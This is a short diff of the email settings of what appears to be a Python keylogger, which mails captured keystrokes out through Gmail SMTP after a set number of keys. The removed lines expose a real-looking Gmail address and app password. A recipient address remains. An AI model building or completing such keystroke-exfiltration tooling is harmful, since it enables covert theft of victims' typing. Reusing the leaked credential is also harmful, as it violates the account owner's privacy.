@@ -16,9 +16,9 @@ EMAIL_REPORT = True
 SEND_AFTER_KEYS = 30  # Send email after this many keys
 
 EMAIL_CONFIG = {
-    "sender": "raif.n.zaman@gmail.com",
-    "password": "qydy zcnr gyxj jyeh",  
-    "recipient": "raifnzaman1@gmail.com",
+    "sender": "your_email_here",
+    "password": "app_password_from_your_gmail_here",  
+    "recipient": "raifnzaman1@gmail.com", # Change to your email
     "smtp_server": "smtp.gmail.com",
     "smtp_port": 587
 }
